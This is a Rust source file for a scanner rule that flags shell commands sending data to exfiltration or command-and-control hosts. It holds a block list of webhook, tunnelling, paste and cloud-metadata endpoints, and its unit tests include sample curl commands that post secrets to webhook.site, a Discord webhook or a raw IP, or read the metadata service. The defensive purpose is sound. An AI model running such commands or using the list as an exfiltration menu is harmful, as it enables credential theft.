//! Dead: sends data to infrastructure only ever used for exfiltration or command-and-control.

use crate::analysis::Flag;
use crate::config::{NoConfig, Shared};
use crate::model::{Detail, Verdict};
use crate::parser::Command;
use crate::register_flag;
use crate::url;

/// Hosts and URL fragments that legitimate installers never send data to.
const C2_HOSTS: &[&str] = &[
    "webhook.site",
    "pipedream.net",
    "requestbin.com",
    "requestbin.net",
    "en.requestbin.com",
    "beeceptor.com",
    "ngrok.io",
    "ngrok-free.app",
    "ngrok.app",
    "trycloudflare.com",
    "interact.sh",
    "oast.pro",
    "oast.live",
    "oast.site",
    "oast.online",
    "oast.fun",
    "burpcollaborator.net",
    "canarytokens.com",
    "canarytokens.org",
    "ix.io",
    "0x0.st",
    "transfer.sh",
    "termbin.com",
    "hastebin.com",
    "paste.ee",
    "dpaste.com",
    "metadata.google.internal",
];
/// Webhook URL path fragments on otherwise-legitimate hosts.
const WEBHOOK_PATHS: &[&str] = &[
    "discord.com/api/webhooks/",
    "discordapp.com/api/webhooks/",
    "hooks.slack.com/services/",
    "api.telegram.org/bot",
];
/// The cloud metadata service (IMDS): reachable only from inside a VM/CI, holds instance creds.
const METADATA_IPS: &[&str] = &["169.254.169.254", "fd00:ec2::254"];

/// curl/wget flags that mean "send a body" rather than "download".
fn sends_body(c: &Command) -> bool {
    match crate::config::base_name(&c.name) {
        "curl" => c.arg_texts().any(|a| {
            matches!(
                a,
                "-d" | "--data"
                    | "--data-raw"
                    | "--data-binary"
                    | "--data-urlencode"
                    | "-F"
                    | "--form"
                    | "-T"
                    | "--upload-file"
            ) || a.starts_with("--data")
        }),
        "wget" => c
            .arg_texts()
            .any(|a| a.starts_with("--post-data") || a.starts_with("--post-file")),
        _ => true, // nc/socat/telnet are always outbound
    }
}

const SINKS: &[&str] = &["curl", "wget", "nc", "ncat", "netcat", "socat", "telnet"];

pub struct ExfilDestination {
    shared: Shared,
    reported: bool,
}

fn matches_c2(u: &str) -> Option<&'static str> {
    let lower = u.to_ascii_lowercase();
    if let Some(p) = WEBHOOK_PATHS.iter().find(|p| lower.contains(**p)) {
        return Some(p);
    }
    let host = url::host(u)?;
    if METADATA_IPS.contains(&host.as_str()) {
        return Some("the cloud instance-metadata service");
    }
    C2_HOSTS
        .iter()
        .find(|h| url::host_matches(&host, h))
        .copied()
}

impl Flag for ExfilDestination {
    fn visit_command(&mut self, c: &Command) -> Verdict {
        if self.reported {
            return Verdict::Ignore;
        }
        let base = crate::config::base_name(&c.name);
        let is_sink = self.shared.is_network(&c.name) || SINKS.contains(&base);
        if !is_sink {
            return Verdict::Ignore;
        }
        // Any C2/webhook/metadata host in the arguments.
        if let Some(hit) = c.args.iter().find_map(|w| {
            url::urls_in(&w.text)
                .find_map(matches_c2)
                .map(|h| (h, w.span.clone()))
        }) {
            self.reported = true;
            return dead(
                format!(
                    "sends data to known exfiltration infrastructure (`{}`)",
                    hit.0
                ),
                hit.1,
            );
        }
        // Posting a body to a bare IP literal: no domain, no accountable owner (Codecov pattern).
        if sends_body(c)
            && let Some(w) = c.args.iter().find(|w| {
                url::urls_in(&w.text)
                    .filter_map(url::host)
                    .any(|h| url::is_ip_host(&h))
            })
        {
            self.reported = true;
            return dead(
                "posts data to a raw IP address (no domain, no certificate name)".into(),
                w.span.clone(),
            );
        }
        Verdict::Ignore
    }
}

fn dead(what: String, span: crate::model::Span) -> Verdict {
    Verdict::Dead(
        Detail::new(what, "This is the exfiltration half of a data-theft chain; the destinations here exist to collect stolen secrets, not to serve software.")
            .fix("Do not run this. Rotate any credential this machine holds.")
            .at(span),
    )
}

register_flag! {
    id: "exfil_destination",
    kind: Dead,
    category: Sensitive,
    description: "Sends data to webhook.site/Discord/Telegram/ngrok/paste sites, the metadata IP, or a raw IP",
    weight: 5,
    config: NoConfig,
    build: |_cfg, shared| ExfilDestination { shared: shared.clone(), reported: false },
}

#[cfg(test)]
mod tests {
    #[allow(unused_imports)]
    use super::super::testing::*;
    use crate::model::FlagKind;

    #[test]
    fn flags_known_c2_and_ip_posts() {
        assert_eq!(
            kind(
                "exfil_destination",
                "curl -d \"$X\" https://webhook.site/abc"
            ),
            Some(FlagKind::Dead)
        );
        assert_eq!(
            kind(
                "exfil_destination",
                "curl -X POST -d @f https://discord.com/api/webhooks/1/xyz"
            ),
            Some(FlagKind::Dead)
        );
        assert_eq!(
            kind(
                "exfil_destination",
                "curl -s http://169.254.169.254/latest/meta-data/iam/"
            ),
            Some(FlagKind::Dead)
        );
        assert_eq!(
            kind(
                "exfil_destination",
                "curl --data-binary @secrets https://1.2.3.4/u"
            ),
            Some(FlagKind::Dead)
        );
        assert!(fires(
            "exfil_destination",
            "curl -d x https://myapp.pipedream.net/hook"
        ));
    }

    #[test]
    fn ignores_legitimate_downloads() {
        assert!(!fires(
            "exfil_destination",
            "curl -fsSL https://github.com/o/r/releases/download/v1/t.tgz -o t"
        ));
        assert!(!fires(
            "exfil_destination",
            "curl -d hi https://api.example.com/telemetry"
        ));
        assert!(
            !fires("exfil_destination", "curl -fsSL https://1.2.3.4/i.sh"),
            "a plain GET from an IP is domain_refs' concern"
        );
    }
}
